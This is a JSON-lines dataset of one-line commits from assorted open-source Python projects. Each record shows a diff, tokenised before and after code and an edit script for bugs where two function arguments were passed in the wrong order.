{"project": "GPYgradients", "commit_sha": "51a4e881da3be605894077c0904aa82d2166e25d", "parent_sha": "0651c933dbb8b6d6fece288db863b54d45c82cbf", "file_path": "GPy/testing/cython_tests.py", "project_url": "https://github.com/esiivola/GPYgradients", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ These tests make sure that the opure python and cython codes work the same\n \n class CythonTestChols(np.testing.TestCase):\n     def setUp(self):\n-        self.flat = np.random.randn(5,45)\n+        self.flat = np.random.randn(45,5)\n         self.triang = np.array([np.eye(20) for i in range(3)])\n     def test_flat_to_triang(self):\n         L1 = choleskies._flat_to_triang_pure(self.flat)\n", "before": "self . flat = np . random . randn ( 5 , 45 )", "after": "self . flat = np . random . randn ( 45 , 5 )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"integer:5\", 3, 37, 3, 38], [\"argument_list\", 3, 36, 3, 42], 3], [\"Move\", [\",:,\", 3, 38, 3, 39], [\"argument_list\", 3, 36, 3, 42], 4]]"}
{"project": "migen", "commit_sha": "24877f271bdec534e8c213d2b4738f47bc0f20a2", "parent_sha": "035870703f28b71e17b965b466345978590a3b0d", "file_path": "migen/actorlib/spi.py", "project_url": "https://github.com/peteut/migen", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class Collector(Actor):\n \t\tdummy = Signal(BV(self._dw))\n \t\twd = Signal(BV(self._dw))\n \t\twe = Signal()\n-\t\twp = MemoryPort(wa, dummy, wd, we)\n+\t\twp = MemoryPort(wa, dummy, we, wd)\n \t\tra = Signal(BV(bits_for(self._depth-1)))\n \t\trd = Signal(BV(self._dw))\n \t\trp = MemoryPort(ra, rd)\n", "before": "wp = MemoryPort ( wa , dummy , wd , we )", "after": "wp = MemoryPort ( wa , dummy , we , wd )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:wd\", 3, 30, 3, 32], [\"argument_list\", 3, 18, 3, 37], 7], [\"Move\", [\",:,\", 3, 32, 3, 33], [\"argument_list\", 3, 18, 3, 37], 8]]"}
{"project": "salt", "commit_sha": "990b69d0dadcc043974f17bf8ad3e24280d8a2e8", "parent_sha": "41c27fc0256cfb078e2373c954915f66176fcbd3", "file_path": "salt/client/ssh/__init__.py", "project_url": "https://github.com/matwey/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -170,7 +170,7 @@ class SSH(object):\n             if deploy.startswith(('n', 'N')):\n                 return ret\n             target['passwd'] = getpass.getpass(\n-                    'Password for {0}@{1}:'.format(host, target['user'])\n+                    'Password for {0}@{1}:'.format(target['user'], host)\n                 )\n             return self._key_deploy_run(host, target, True)\n         return ret\n", "before": "target [ 'passwd' ] = getpass . getpass ( 'Password for {0}@{1}:' . format ( host , target [ 'user' ] ) )", "after": "target [ 'passwd' ] = getpass . getpass ( 'Password for {0}@{1}:' . format ( target [ 'user' ] , host ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 51, 3, 73], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 51, 3, 73], [\"identifier:host\", \"T\"], 4], [\"Delete\", [\"identifier:host\", 3, 52, 3, 56]], [\"Delete\", [\",:,\", 3, 56, 3, 57]]]"}
{"project": "jira", "commit_sha": "de0c1723c5ab261bbb881adc83035435f4850154", "parent_sha": "3748fa97ba22abf85cb661148e16c515a3657eb7", "file_path": "tests/tests.py", "project_url": "https://github.com/seize-the-dave/jira", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1612,7 +1612,7 @@ class UserTests(unittest.TestCase):\n \n     def test_search_users_maxresults(self):\n         users = self.jira.search_users(self.test_manager.CI_JIRA_USER, maxResults=1)\n-        self.assertGreaterEqual(len(users), 1)\n+        self.assertGreaterEqual(1, len(users))\n \n     def test_search_allowed_users_for_issue_by_project(self):\n         users = self.jira.search_allowed_users_for_issue(self.test_manager.CI_JIRA_USER,\n", "before": "self . assertGreaterEqual ( len ( users ) , 1 )", "after": "self . assertGreaterEqual ( 1 , len ( users ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 47], [\"integer:1\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 32, 3, 47], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 43, 3, 44]], [\"Delete\", [\"integer:1\", 3, 45, 3, 46]]]"}
{"project": "ansible-modules-hashivault", "commit_sha": "2efd847636f4f60e5bd10d3df8c55df39eac0f35", "parent_sha": "d072a0e19b0ab9c52f5025cc85ac68098bbf0bae", "file_path": "ansible/modules/hashivault/hashivault_k8s_auth_config.py", "project_url": "https://github.com/TerryHowe/ansible-modules-hashivault", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -84,7 +84,7 @@ def hashivault_k8s_auth_config(module):\n     keys_updated = desired_state.keys()\n     try:\n         current_state = client.auth.kubernetes.read_config(mount_point=mount_point)\n-        keys_updated = get_keys_updated(current_state, desired_state)\n+        keys_updated = get_keys_updated(desired_state, current_state)\n         if not keys_updated:\n             return {'changed': False}\n     except InvalidPath:\n", "before": "keys_updated = get_keys_updated ( current_state , desired_state )", "after": "keys_updated = get_keys_updated ( desired_state , current_state )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:current_state\", 3, 41, 3, 54], [\"argument_list\", 3, 40, 3, 70], 3], [\"Move\", [\",:,\", 3, 54, 3, 55], [\"argument_list\", 3, 40, 3, 70], 4]]"}
{"project": "python_wow", "commit_sha": "8baeb6e4f032c433b46ab0ae674b0deebf840684", "parent_sha": "8146605d0f9940dee82adf0781922b7242e2c80f", "file_path": "command_router.py", "project_url": "https://github.com/Enether/python_wow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ def route_main_commands(main_character, zone_object):\n     elif command == 'go to ?':\n         ch.handle_go_to_help_command(zone_object)\n     elif command == 'print available quests' or command == 'paq':\n-        ch.handle_paq_command(main_character, zone_object)\n+        ch.handle_paq_command(zone_object, main_character)\n     elif command == 'print quest log' or command == 'pql':\n         ch.handle_pql_command(zone_object)\n     elif command == 'print equipment' or command == 'peq':\n", "before": "elif command == 'print available quests' or command == 'paq' : ch . handle_paq_command ( main_character , zone_object )", "after": "elif command == 'print available quests' or command == 'paq' : ch . handle_paq_command ( zone_object , main_character )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:main_character\", 3, 31, 3, 45], [\"argument_list\", 3, 30, 3, 59], 3], [\"Move\", [\",:,\", 3, 45, 3, 46], [\"argument_list\", 3, 30, 3, 59], 4]]"}
{"project": "picopt", "commit_sha": "a1e2b81652559be393c4a715f6c235a929067f22", "parent_sha": "8d50082f626af45f28aba73df7eaff0a8d430a17", "file_path": "picopt/walk.py", "project_url": "https://github.com/ajslater/picopt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ def _walk_all_files():\n             record_dirs.add(filename_full)\n \n         walk_after = timestamp.get_walk_after(filename_full)\n-        results = walk_file(filename_full, Settings.recurse, walk_after)\n+        results = walk_file(filename_full, walk_after, Settings.recurse)\n         result_set = result_set.union(results)\n \n     bytes_in = 0\n", "before": "results = walk_file ( filename_full , Settings . recurse , walk_after )", "after": "results = walk_file ( filename_full , walk_after , Settings . recurse )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 73], [\"identifier:walk_after\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 28, 3, 73], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 60, 3, 61]], [\"Delete\", [\"identifier:walk_after\", 3, 62, 3, 72]]]"}
{"project": "azure-cli", "commit_sha": "99241d40c25f543961373e5313dc604b2ef4406b", "parent_sha": "56daefa85142a734ea8703f6fac2f4f8804d3e94", "file_path": "src/command_modules/azure-cli-appservice/azure/cli/command_modules/appservice/custom.py", "project_url": "https://github.com/Prasanna-Padmanabhan/azure-cli", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1626,7 +1626,7 @@ def _validate_and_get_connection_string(cli_ctx, resource_group_name, storage_ac\n \n     for e in ['blob', 'queue', 'table']:\n         if not getattr(endpoints, e, None):\n-            error_message = \"Storage account '{}' has no '{}' endpoint. It must have table, queue, and blob endpoints all enabled\".format(e, storage_account)   # pylint: disable=line-too-long\n+            error_message = \"Storage account '{}' has no '{}' endpoint. It must have table, queue, and blob endpoints all enabled\".format(storage_account, e)   # pylint: disable=line-too-long\n     if sku not in allowed_storage_types:\n         error_message += 'Storage type {} is not allowed'.format(sku)\n \n", "before": "error_message = \"Storage account '{}' has no '{}' endpoint. It must have table, queue, and blob endpoints all enabled\" . format ( e , storage_account )", "after": "error_message = \"Storage account '{}' has no '{}' endpoint. It must have table, queue, and blob endpoints all enabled\" . format ( storage_account , e )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:e\", 3, 139, 3, 140], [\"argument_list\", 3, 138, 3, 158], 3], [\"Move\", [\",:,\", 3, 140, 3, 141], [\"argument_list\", 3, 138, 3, 158], 4]]"}
{"project": "InfraRed", "commit_sha": "8dafba39f2fdb5d02dd1f0c9cf6349edd167f839", "parent_sha": "9cd017800edaf852844cc472f319dba92cbb8d4e", "file_path": "cli/spec.py", "project_url": "https://github.com/bkreitch/InfraRed", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -300,7 +300,7 @@ def override_default_values(clg_args, sub_parser_options):\n         # Override defaults with the ini file args if provided\n         file_args = getattr(clg_args.get('from-file'), \"value\", {}).get(\n             clg_args['command0'], {})\n-        utils.dict_merge(file_args, defaults)\n+        utils.dict_merge(defaults, file_args)\n \n         # Resolve defaults and load values to clg_args\n         for arg_name, arg_obj in clg_args.iteritems():\n", "before": "utils . dict_merge ( file_args , defaults )", "after": "utils . dict_merge ( defaults , file_args )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:file_args\", 3, 26, 3, 35], [\"argument_list\", 3, 25, 3, 46], 3], [\"Move\", [\",:,\", 3, 35, 3, 36], [\"argument_list\", 3, 25, 3, 46], 4]]"}
{"project": "specutils", "commit_sha": "533c1341706373a2c0ef51bac6f1ac574f9a97a8", "parent_sha": "ae2ffd224d0ef884004880501c06504562c16fa2", "file_path": "specutils/core/generic.py", "project_url": "https://github.com/astrofrog/specutils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class GenericSpectrum1D(NDIOMixin, NDSlicingMixin, NDArithmeticMixin,\n \n         self_kwargs.update(kwargs)\n \n-        return cls(**self_kwargs, copy=deep_copy)\n+        return cls(copy=deep_copy, **self_kwargs)\n \n     @classmethod\n     def from_array(cls, data, *args, **kwargs):\n", "before": "return cls ( ** self_kwargs , copy = deep_copy )", "after": "return cls ( copy = deep_copy , ** self_kwargs )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 35, 3, 49], [\"argument_list\", 3, 19, 3, 50], 1], [\"Insert\", [\"argument_list\", 3, 19, 3, 50], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 33, 3, 34]]]"}
{"project": "WALinuxAgent", "commit_sha": "3c54d08a20c26c435ddb3f6dd5071cfbf9ad22ff", "parent_sha": "7e0351c78da6b50aa771048431ba26b7dfd97da9", "file_path": "azurelinuxagent/ga/exthandlers.py", "project_url": "https://github.com/Azure/WALinuxAgent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -773,7 +773,7 @@ class ExtHandlerInstance(object):\n                         \"code\" : 0\n                     }\n                 }\n-                fileutil.write_file(json.dumps(status), status_path)\n+                fileutil.write_file(status_path, json.dumps(status))\n \n             conf_dir = self.get_conf_dir()\n             fileutil.mkdir(conf_dir, mode=0o700)\n", "before": "fileutil . write_file ( json . dumps ( status ) , status_path )", "after": "fileutil . write_file ( status_path , json . dumps ( status ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 36, 3, 69], [\"identifier:status_path\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 36, 3, 69], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 55, 3, 56]], [\"Delete\", [\"identifier:status_path\", 3, 57, 3, 68]]]"}
{"project": "dask", "commit_sha": "7a98af4dcdba36e05036bb3ccc695612e2755cfe", "parent_sha": "620be02d35053db7883bb8876a69b255827860e8", "file_path": "dask/array/routines.py", "project_url": "https://github.com/QuLogic/dask", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -545,7 +545,7 @@ def gradient(f, *varargs, **kwargs):\n                 raise ValueError(\n                     \"Chunk size must be larger than edge_order + 1. \"\n                     \"Minimum chunk for axis {} is {}. Rechunk to \"\n-                    \"proceed.\".format(np.min(c), ax)\n+                    \"proceed.\".format(ax, np.min(c))\n                 )\n \n         if np.isscalar(varargs[i]):\n", "before": "raise ValueError ( \"Chunk size must be larger than edge_order + 1. \" \"Minimum chunk for axis {} is {}. Rechunk to \" \"proceed.\" . format ( np . min ( c ) , ax ) )", "after": "raise ValueError ( \"Chunk size must be larger than edge_order + 1. \" \"Minimum chunk for axis {} is {}. Rechunk to \" \"proceed.\" . format ( ax , np . min ( c ) ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 53], [\"identifier:ax\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 38, 3, 53], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 48, 3, 49]], [\"Delete\", [\"identifier:ax\", 3, 50, 3, 52]]]"}
{"project": "jcvi", "commit_sha": "724ac8ad6338106b7d88ecab542a5786aa5f1f7b", "parent_sha": "08efb05504e873b68aba70226089480a2fb6fdcd", "file_path": "annotation/train.py", "project_url": "https://github.com/tanghaibao/jcvi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ def pasa(args):\n     if need_update((fastafile, gffile), (transcodergff, transcodergenomegff)):\n         cmd = \"{0}/scripts/pasa_asmbls_to_training_set.dbi\".format(opts.pasa_home)\n         cmd += \" --pasa_transcripts_fasta {0} --pasa_transcripts_gff3 {1}\".\\\n-                format(gffile, fastafile)\n+                format(fastafile, gffile)\n         sh(cmd)\n \n     completeids = fastafile.rsplit(\".\", 1)[0] + \".complete.ids\"\n", "before": "cmd += \" --pasa_transcripts_fasta {0} --pasa_transcripts_gff3 {1}\" . format ( gffile , fastafile )", "after": "cmd += \" --pasa_transcripts_fasta {0} --pasa_transcripts_gff3 {1}\" . format ( fastafile , gffile )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:gffile\", 3, 24, 3, 30], [\"argument_list\", 3, 23, 3, 42], 3], [\"Move\", [\",:,\", 3, 30, 3, 31], [\"argument_list\", 3, 23, 3, 42], 4]]"}
{"project": "django-dynamic-fixture", "commit_sha": "b1700d9ef8c122d0a06183777ff6b2981cf64fe8", "parent_sha": "b54a660b592f6ce06a8e930289bee9165862be7d", "file_path": "django_dynamic_fixture/fixture_algorithms/default_fixture.py", "project_url": "https://github.com/paulocheque/django-dynamic-fixture", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class GeoDjangoDataFixture(object):\n         # latitude: [-90,90], longitude: [-180,180]\n         latitude = x or random.randint(-90, 90)\n         longitude = y or random.randint(-180, 180)\n-        return Point(latitude, longitude)\n+        return Point(longitude, latitude)\n \n     def create_points(self, n=3, closed=True):\n         points = [self.create_point() for i in range(n)]\n", "before": "return Point ( latitude , longitude )", "after": "return Point ( longitude , latitude )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:latitude\", 3, 22, 3, 30], [\"argument_list\", 3, 21, 3, 42], 3], [\"Move\", [\",:,\", 3, 30, 3, 31], [\"argument_list\", 3, 21, 3, 42], 4]]"}
{"project": "ironic", "commit_sha": "fb3f7e39e528979655da74ba808e68d05b5c676c", "parent_sha": "e67f9abefb1faaf4ed654f8c15028b5fd28b4fc5", "file_path": "ironic_tempest_plugin/tests/api/admin/test_nodes.py", "project_url": "https://github.com/openstack/ironic", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,5 +165,5 @@ class TestNodes(base.BaseBaremetalTest):\n     def test_get_node_by_instance_uuid(self):\n         instance_uuid = self._associate_node_with_instance()\n         _, body = self.client.show_node_by_instance_uuid(instance_uuid)\n-        self.assertEqual(len(body['nodes']), 1)\n+        self.assertEqual(1, len(body['nodes']))\n         self.assertIn(self.node['uuid'], [n['uuid'] for n in body['nodes']])\n", "before": "self . assertEqual ( len ( body [ 'nodes' ] ) , 1 )", "after": "self . assertEqual ( 1 , len ( body [ 'nodes' ] ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 48], [\"integer:1\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 25, 3, 48], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 44, 3, 45]], [\"Delete\", [\"integer:1\", 3, 46, 3, 47]]]"}
{"project": "erpnext", "commit_sha": "0db423ed5f6801631d5f07a7e4c1ca323bdeb9b2", "parent_sha": "8cf841ce602948c87819669b220f40b83ee3d306", "file_path": "erpnext/hr/doctype/shift_type/shift_type.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class ShiftType(Document):\n \t\tfor date in dates:\n \t\t\tshift_details = get_employee_shift(employee, date, True)\n \t\t\tif shift_details and shift_details.shift_type.name == self.name:\n-\t\t\t\tmark_attendance(employee, date, self.name, 'Absent')\n+\t\t\t\tmark_attendance(employee, date, 'Absent', self.name)\n \n \tdef get_assigned_employee(self, from_date=None, consider_default_shift=False):\n \t\tfilters = {'date':('>=', from_date), 'shift_type': self.name, 'docstatus': '1'}\n", "before": "mark_attendance ( employee , date , self . name , 'Absent' )", "after": "mark_attendance ( employee , date , 'Absent' , self . name )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 20, 3, 57], [\"string:'Absent'\", \"T\"], 5], [\"Insert\", [\"argument_list\", 3, 20, 3, 57], [\",:,\", \"T\"], 6], [\"Delete\", [\",:,\", 3, 46, 3, 47]], [\"Delete\", [\"string:'Absent'\", 3, 48, 3, 56]]]"}
{"project": "PyFxA", "commit_sha": "cca950f022b494ef0930e8358b427f6d21a40b6e", "parent_sha": "c4a70fa318c86ab4721a6e2d20318b139bbb3b2a", "file_path": "fxa/__main__.py", "project_url": "https://github.com/mozilla/PyFxA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ def main(args=None):\n                         dest='browserid',\n                         action='store_true')\n \n-    parser.add_argument('--create-user', '-c',\n+    parser.add_argument('-c', '--create-user',\n                         help='Create a new user',\n                         dest='create',\n                         action='store_true')\n", "before": "action = 'store_true' ) parser . add_argument ( '--create-user' , '-c' , help = 'Create a new user' , dest = 'create' , action = 'store_true' )", "after": "action = 'store_true' ) parser . add_argument ( '-c' , '--create-user' , help = 'Create a new user' , dest = 'create' , action = 'store_true' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"string:'--create-user'\", 3, 25, 3, 40], \"'-c'\"], [\"Update\", [\"string:'-c'\", 3, 42, 3, 46], \"'--create-user'\"]]"}
{"project": "bl-wxpy", "commit_sha": "e2e191f226e74c9ea3547b94a5f4cf4bef2120dc", "parent_sha": "0b7648a0f26060153f507bf32775af5bf8d0ae8a", "file_path": "wxpy/api/messages/sent_message.py", "project_url": "https://github.com/frkhit/bl-wxpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ class SentMessage(object):\n         from wxpy import Group\n \n-        if isinstance(Group, self.receiver):\n+        if isinstance(self.receiver, Group):\n             return self.receiver.self\n \n     @property\n", "before": "if isinstance ( Group , self . receiver ) : return self . receiver . self", "after": "if isinstance ( self . receiver , Group ) : return self . receiver . self", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 22, 2, 44], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 2, 22, 2, 44], [\"identifier:Group\", \"T\"], 4], [\"Delete\", [\"identifier:Group\", 2, 23, 2, 28]], [\"Delete\", [\",:,\", 2, 28, 2, 29]]]"}
{"project": "Probabilistic-BDP", "commit_sha": "dcf6382f8dea11e34c28a350f16a10f53def35ac", "parent_sha": "90c53cc9c81783275558b71c1c0d0278153b3f39", "file_path": "pbdp/benchmark.py", "project_url": "https://github.com/THeK3nger/Probabilistic-BDP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ def random_free_cell(map):\n     count = 1\n     probability = 1\n     chosen = None\n-    for r, c in itertools.product(range(map.width), range(map.height)):\n+    for r, c in itertools.product(range(map.height), range(map.width)):\n         if map.is_traversable((r, c)):\n             if random.random() < probability:\n                 chosen = (r, c)\n", "before": "for r , c in itertools . product ( range ( map . width ) , range ( map . height ) ) : if map . is_traversable ( ( r , c ) ) : if random . random ( ) < probability : chosen = ( r , c )", "after": "for r , c in itertools . product ( range ( map . height ) , range ( map . width ) ) : if map . is_traversable ( ( r , c ) ) : if random . random ( ) < probability : chosen = ( r , c )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"call\", 3, 35, 3, 51], [\"argument_list\", 3, 34, 3, 71], 2], [\"Move\", [\"call\", 3, 53, 3, 70], [\"argument_list\", 3, 34, 3, 71], 1]]"}
{"project": "oe-core", "commit_sha": "05e2c4ada7083f40866846a21fe76c852f1dfefe", "parent_sha": "44f4c97234623cbd770fbc86eabb04e7e0c91061", "file_path": "scripts/lib/devtool/upgrade.py", "project_url": "https://github.com/OSSystems/oe-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -433,7 +433,7 @@ def upgrade(args, config, basepath, workspace):\n                         copied, config.workspace_path, rd)\n         standard._add_md5(config, pn, af)\n \n-        update_unlockedsigs(basepath, workspace, [pn], args.fixed_setup)\n+        update_unlockedsigs(basepath, workspace, args.fixed_setup, [pn])\n \n         logger.info('Upgraded source extracted to %s' % srctree)\n         logger.info('New recipe is %s' % rf)\n", "before": "update_unlockedsigs ( basepath , workspace , [ pn ] , args . fixed_setup )", "after": "update_unlockedsigs ( basepath , workspace , args . fixed_setup , [ pn ] )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"list\", 3, 50, 3, 54], [\"argument_list\", 3, 28, 3, 73], 6], [\"Move\", [\"attribute\", 3, 56, 3, 72], [\"argument_list\", 3, 28, 3, 73], 5]]"}
{"project": "symengine.py", "commit_sha": "ffd46e734b07377229e79c334040b1f02f7c4db8", "parent_sha": "8a9930948c869af5de9ea38704a4dfd1901c9f17", "file_path": "symengine/tests/test_ntheory.py", "project_url": "https://github.com/Midnighter/symengine.py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ def test_quotient_mod_error():\n \n def test_mod_inverse():\n     mod_inverse(2, 7) == 4\n-    mod_inverse(3, 0) == None\n+    mod_inverse(0, 3) == None\n     mod_inverse(4, 6) == None\n \n def test_crt():\n", "before": "mod_inverse ( 3 , 0 ) == None", "after": "mod_inverse ( 0 , 3 ) == None", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"integer:3\", 3, 17, 3, 18], [\"argument_list\", 3, 16, 3, 22], 3], [\"Move\", [\",:,\", 3, 18, 3, 19], [\"argument_list\", 3, 16, 3, 22], 4]]"}
{"project": "Spamnesty", "commit_sha": "c155306ba23c8c921cc8810b995464743ee56018", "parent_sha": "d00e4d5c7f4e523c00895af24e64558b48a3236f", "file_path": "main/tests/smoke_tests.py", "project_url": "https://github.com/phufbv/Spamnesty", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,4 +17,4 @@ class WebhookTests(TestCase):\n         self.assertEqual(response.status_code, 200)\n         self.assertEqual(response.content, b\"OK\")\n         self.assertEqual(len(mail.outbox), 1)\n-        self.assertIn(mail.outbox[0].subject, \"didn't work out\")\n+        self.assertIn(\"didn't work out\", mail.outbox[0].subject)\n", "before": "self . assertIn ( mail . outbox [ 0 ] . subject , \"didn't work out\" )", "after": "self . assertIn ( \"didn't work out\" , mail . outbox [ 0 ] . subject )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 65], [\"string:\\\"didn't work out\\\"\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 22, 3, 65], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 45, 3, 46]], [\"Delete\", [\"string:\\\"didn't work out\\\"\", 3, 47, 3, 64]]]"}
{"project": "conclave", "commit_sha": "8843aa3c25ef71cf4043e8365a98d92d099abce2", "parent_sha": "babed6efec59721f9acd4f868ed85e0785469f74", "file_path": "examples/taxi_workflow.py", "project_url": "https://github.com/robbaronbu/conclave", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def protocol():\n     divA = sal.divide(aggA, \"divA\", \"aggA_1\", [\"aggA_1\", 1000])\n     multA = sal.multiply(divA, \"multA\", \"divA_0\", [\"divA_0\", 0])\n     multB = sal.multiply(multA, \"multB\", \"multA_1\", [\"multA_1\", 100])\n-    aggB = sal.aggregate(multA, \"aggB\", \"multA_1\", \"multA_0\", \"+\")\n+    aggB = sal.aggregate(multA, \"aggB\", \"multA_0\", \"multA_1\", \"+\")\n     joinA = sal.join(multB, aggB, \"joinA\", \"multB_0\", \"aggB_0\")\n     divB = sal.divide(joinA, \"divB\", \"joinA_1\", [\"joinA_1\", \"joinA_2\"])\n     multC = sal.multiply(divB, \"multC\", \"divB_1\", [\"divB_1\", \"divB_1\"])\n", "before": "aggB = sal . aggregate ( multA , \"aggB\" , \"multA_1\" , \"multA_0\" , \"+\" )", "after": "aggB = sal . aggregate ( multA , \"aggB\" , \"multA_0\" , \"multA_1\" , \"+\" )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:\\\"multA_1\\\"\", 3, 41, 3, 50], [\"argument_list\", 3, 25, 3, 67], 7], [\"Move\", [\",:,\", 3, 50, 3, 51], [\"argument_list\", 3, 25, 3, 67], 8]]"}
{"project": "Flexget", "commit_sha": "a653379a15921aba1f08aa744aae5dfa0516982b", "parent_sha": "0a780cd8d0a88e2f80dea565590ddeab35c08b5f", "file_path": "tests/test_tvmaze.py", "project_url": "https://github.com/BrutuZ/Flexget", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -379,7 +379,7 @@ class TestTVMazeShowLookup(object):\n \n         # force episode lookup\n         for entry in task.entries:\n-            getattr('tvmaze_episode_season', entry)\n+            getattr(entry, 'tvmaze_episode_season')\n \n         with Session() as session:\n             episodes = session.query(TVMazeEpisodes).all()\n", "before": "getattr ( 'tvmaze_episode_season' , entry )", "after": "getattr ( entry , 'tvmaze_episode_season' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'tvmaze_episode_season'\", 3, 21, 3, 44], [\"argument_list\", 3, 20, 3, 52], 3], [\"Move\", [\",:,\", 3, 44, 3, 45], [\"argument_list\", 3, 20, 3, 52], 4]]"}
{"project": "Qcodes", "commit_sha": "1561ded9e39ebc100992f0b22118444610363ccd", "parent_sha": "94809b1f0dc3b67298441bcc39e177eb0e3d437f", "file_path": "qcodes/instrument_drivers/keysight/SD_common/SD_AWG.py", "project_url": "https://github.com/nulinspiratie/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -251,7 +251,7 @@ class SD_AWG(SD_Module):\n \n         for i in range(self.channels):\n             self.awg_stop(i)\n-            self.set_channel_wave_shape(i, 0)\n+            self.set_channel_wave_shape(0, i)\n \n \n     def reset_clock_phase(self, trigger_behaviour, trigger_source, skew=0.0, verbose=False):\n", "before": "self . set_channel_wave_shape ( i , 0 )", "after": "self . set_channel_wave_shape ( 0 , i )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:i\", 3, 41, 3, 42], [\"argument_list\", 3, 40, 3, 46], 3], [\"Move\", [\",:,\", 3, 42, 3, 43], [\"argument_list\", 3, 40, 3, 46], 4]]"}
